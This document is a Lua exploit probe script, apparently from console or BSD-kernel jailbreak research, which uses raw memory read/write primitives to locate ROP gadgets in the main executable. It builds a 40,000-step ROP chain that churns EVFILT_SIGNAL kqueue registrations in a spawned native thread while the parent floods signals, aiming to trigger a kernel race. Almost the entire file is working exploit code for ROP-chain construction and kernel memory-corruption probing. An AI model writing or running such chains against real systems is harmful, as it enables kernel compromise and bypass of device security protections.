-- CRASH_CLASS: HIGH
-- PROBE 773a: EVFILT_SIGNAL add/delete churn from a native child
--
-- 771b [C] used a Lua helper and died at the 8.9 s helper wall, which
-- confounds the race. A native child needs no helper: kevent's args 4-6 are
-- zero in the (zeroed) context, so a linear chain of
--   [pop_rax 363][pop_rdi kq][pop_rsi ch][pop_rdx 1]
--   [fn]
-- repeats the registration change. The parent storms SIGUSR1 meanwhile.
print("=== PROBE 773a: SIGNAL KNOTE NATIVE RACE ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function ww(a,v) pcall(function() memory.write_word(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local function mmap(px)
    local ok,r=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    if not ok then return 0 end
    local a=to_num(r); if a>0 then zero(a,px) end; return a
end
local function find_pat(base,size,pat)
    local off,limit,chunk=0,size-0x20,0x8000
    while off<limit do
        local want=limit-off; if want>chunk then want=chunk end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true)
        if i then return base+off+i-1 end
        off=off+want
    end
    return nil
end
local SIG=30
local EV_ADD,EV_DELETE=0x0001,0x0002
local F_SIG=0xFFFA
local pid=call(mk(20),0,0,0,0,0,0)
local act=to_num(memory.alloc(0x40)); zero(act,0x40); wd(act,1)
print("[A] sigaction="..tostring(call(mk(416),SIG,act,0,0,0,0)))
local kq=call(mk(362),0,0,0,0,0,0)
local ev=to_num(memory.alloc(0x200)); local ts=to_num(memory.alloc(0x10))
local cha=to_num(memory.alloc(0x40)); zero(cha,0x40)
wq(cha+0,SIG); ww(cha+8,F_SIG); ww(cha+10,EV_ADD)
local chd=to_num(memory.alloc(0x40)); zero(chd,0x40)
wq(chd+0,SIG); ww(chd+8,F_SIG); ww(chd+10,EV_DELETE)
print(string.format("[A] kq=%s register=%s",tostring(kq),tostring(call(mk(363),kq,cha,1,ev,1,ts))))
local rb=mmap(0x8000)
local cnt=to_num(memory.alloc(8)); wd(cnt,0)
call(mk(674),rb,72,512,cnt,0x40000000,0)
local n=rd(cnt) or 0
local ebase,bsz=nil,0
for i=0,math.min(n,512)-1 do
    local r=rb+i*72
    local a=rd(r)+(rd(r+4) or 0)*4294967296
    local b=rd(r+8)+(rd(r+12) or 0)*4294967296
    if rd(r+0x18)==5 and (b-a)>0x200000 and a<0x1000000000 and (b-a)>bsz then ebase,bsz=a,b-a end
end
if not ebase then print("[A] no eboot") return end
local pop_rax=find_pat(ebase,bsz,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,bsz,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,bsz,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,bsz,string.char(0x5A,0xC3))
local jmp_g  =find_pat(ebase,bsz,string.char(0xEB,0xFE))
print(string.format("[B] gadgets rax=%s rdi=%s rsi=%s rdx=%s jmp=%s",tostring(pop_rax),tostring(pop_rdi),tostring(pop_rsi),tostring(pop_rdx),tostring(jmp_g)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[B] missing") return end
local fn=to_num(syscall.pipe.fn_addr)
local K=40000
local need=K*(9+9)*8+0x1000
local stack=mmap(need+0x1000)
if stack==0 then print("[C] mmap failed") return end
local base=stack
local off=0
local function word(v) wq(base+off,v); off=off+8 end
for i=1,K do
    word(pop_rax); word(363); word(pop_rdi); word(kq); word(pop_rsi); word(chd); word(pop_rdx); word(1); word(fn)
    word(pop_rax); word(363); word(pop_rdi); word(kq); word(pop_rsi); word(cha); word(pop_rdx); word(1); word(fn)
end
word(pop_rax); word(431); word(fn); word(jmp_g)
print(string.format("[C] chain words=%d bytes=%d base=%X",off/8,off,base))
local ctx=to_num(memory.alloc(0x500)); zero(ctx,0x500)
wq(ctx+0x108,uint64(0x480)); wq(ctx+0x110,uint64(0x10000))
wq(ctx+0x0C0,uint64(0x43));  wq(ctx+0x100,uint64(0x3B))
wq(ctx+0x0E0,uint64(fn));    wq(ctx+0x0F8,uint64(base))
wq(ctx+0x078,uint64(20))
local tid=to_num(memory.alloc(0x40)); zero(tid,0x40)
local function spawn()
    zero(tid,0x40)
    local ctx2=to_num(memory.alloc(0x500)); zero(ctx2,0x500)
    wq(ctx2+0x108,uint64(0x480)); wq(ctx2+0x110,uint64(0x10000))
    wq(ctx2+0x0C0,uint64(0x43));  wq(ctx2+0x100,uint64(0x3B))
    wq(ctx2+0x0E0,uint64(fn));    wq(ctx2+0x0F8,uint64(base))
    wq(ctx2+0x078,uint64(20))
    return call(mk(430),ctx2,tid,0,0,0,0)
end
-- control: same chain, no signals
print("[D] control thr_create="..tostring(spawn()))
for i=1,20000 do call(mk(20),0,0,0,0,0,0) end
zero(ev,0x200)
print(string.format("[D] control alive=%s poll=%s",tostring(call(mk(20),0,0,0,0,0,0)),tostring(call(mk(363),kq,0,0,ev,4,ts))))
-- race: churn while storming
print("[E] race thr_create="..tostring(spawn()))
local storm=0
for i=1,20000 do call(mk(37),pid,SIG,0,0,0,0); storm=storm+1 end
print(string.format("[E] storm=%d alive=%s",storm,tostring(call(mk(20),0,0,0,0,0,0))))
zero(ev,0x200)
print(string.format("[E] poll=%s ident=%d data=%s",tostring(call(mk(363),kq,0,0,ev,4,ts)),rd(ev),rd(ev+16) or 0))
print(string.format("[E] delete=%s alive=%s",tostring(call(mk(363),kq,chd,1,ev,1,ts)),tostring(call(mk(20),0,0,0,0,0,0))))
print("=== 773a DONE ===")
